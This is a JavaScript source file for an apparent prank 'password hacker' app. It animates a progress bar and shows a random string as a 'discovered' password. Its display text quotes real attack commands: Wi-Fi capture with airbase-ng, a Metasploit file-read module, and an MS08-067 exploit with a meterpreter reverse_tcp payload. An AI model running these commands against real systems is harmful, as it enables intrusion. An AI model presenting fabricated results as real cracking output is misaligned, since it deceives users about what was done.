var app = {
    initialize: function() {
        this.bindEvents();
    },
    bindEvents: function() {
        document.addEventListener('deviceready', this.onDeviceReady, false);
        document.getElementById('hackbtn').addEventListener("click", fhack, false);
    },
    onDeviceReady: function() {
        app.receivedEvent('deviceready');
    },
    receivedEvent: function(id) {
        var parentElement = document.getElementById(id);
        var listeningElement = parentElement.querySelector('.listening');
        var receivedElement = parentElement.querySelector('.received');
        listeningElement.setAttribute('style', 'display:none;');
        receivedElement.setAttribute('style', 'display:block;');
    }
};

app.initialize();


function fhack() {
    var username = $('#username').val();
    if(username === '') {
        alert("Error");
        return false;
    }
    
    moveTopBar();
}

function moveTopBar(){
    $('.top').animate({marginTop:'-40%'}, {
        easing: 'swing',
        duration: 500,
        complete: function(){                    
            hideUserInterface();            
            var n = animateProgressBar();            
        }
    });
}

function hideUserInterface(){
    $('.middle .row:first-child()').addClass('hidden');
    $('.middle .row:nth-child(2)').removeClass('hidden');
}

function animateProgressBar(){
    var progressbar = $('#progress'),
        max = progressbar.attr('max'),
        time = (1000/max)*10,    
        value = progressbar.val();
 
    var loading = function() {
        value += 1;
        addValue = progressbar.val(value);
         
        $('.progress-value').html(value + '%');
        
        buildOutput(value);

        if (value == max) {
            clearInterval(animate);   
            showResults(parseInt((Math.random()*101|0) % 2));            
        }
    };
 
    var animate = setInterval(function() {
        loading();
    }, time);
}


function getPassword(){
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789*¿?=)(/&%$·!*]{}[·̣";
    var _min = 8, _max = 25;

    for( var i=0; i < randomNumber(_min, _max); i++ )
        text += possible.charAt(Math.floor(Math.random() * possible.length));

    return text;
}


function randomNumber(min, max) {
    return Math.round(Math.random() * (max - min) + min);
}

function showResults(n){
    if(n >= 1){
        $('#msg').addClass('ok').text("Success").delay(3000);
        $('#result').text('Password: ' + getPassword());
    }else{
        $('#msg').addClass('error').text("Error: the password could not be discovered");
    }            
}


function buildOutput(n){
    var text = [
        '$ airbase-ng -c 9 -e teddy -s -W 1 wlan0\n',
        '   Created tap interface at0',
        '   Got 140 bytes keystream: 00:0F:B5:88:AC:82',
        '   SKA from 00:0F:B5:88:AC:82',
        '   Client 00:0F:B5:88:AC:82 associated to ESSID: "teddy"\n',
        '$ airodump-ng -c 9 wlan0\n',
        '$ airbase-ng -c 9 -e teddy -z 2 -W 1 rausb0\n',
        '   Created tap interface at0\n',
        '   Client 00:0F:B5:AB:CB:9D associated to ESSID: "teddy"\n',
        '   Opening cfrag-01.cap\n',
        '   Read 114392 packets.\n',
        '   00:C0:C6:94:F4:87  teddy                     WPA (1 handshake)\n',
        '$ msf > use auxiliary/admin/postgres/postgres_readfile\n',
        '$ msf > auxiliary(postgres_readfile) > set PASSWORD toor\n',
        '$ msf > auxiliary(postgres_readfile) > set RFILE /etc/hosts\n',
        '$ msf > auxiliary(postgres_readfile) > set RHOST 127.0.0.1\n',
        '$ msf > auxiliary(postgres_readfile) > run\n',
        '$ msf > irb\n',
        '   [*] Starting IRB shell...\n',
        '   >> Msf::Config.log_directory\n',
        '   => "/Users/test/.msf4/logs"\n',
        '$ import os, msfrpc, optparse, sys, subprocess\n',
        '   from time import sleep\n',
        '$ def sploiter(RHOST, LHOST, LPORT, session):\n',
        '   client = msfrpc.Msfrpc({})\n',
        '   client.login("msf", "123")\n',
        '   ress = client.call("console.create")\n',
        '   console_id = ress["id"]\n',
        '   RHOST="192.168.1.102"\n',
        '   LPORT="444"\n',
        '   LHOST="127.0.0.1"\n',
        '   commands = """use exploit/windows/smb/ms08_067_netapi\n',
        '$ set PAYLOAD windows/meterpreter/reverse_tcp\n',
        '$ set RHOST """+RHOST+"""\n',
        '$ set LHOST """+LHOST+"""\n',
        '$ set LPORT """+LPORT+"""\n',
        '$ set ExitOnSession false\n',
        '$ exploit -z\n',
        '$ """\n',
        '$ print "[+] Exploiting MS08-067 on: "+RHOST\n',
        '$ client.call("console.write",[console_id,commands])\n',
        '$ res = client.call("console.read",[console_id])\n',
        '$ result = res["data"].split("\n")\n',
    ];
    text = text.concat(text);
    text = text.concat(text);

    $('#output').val($('#output').val() + text[n]);
}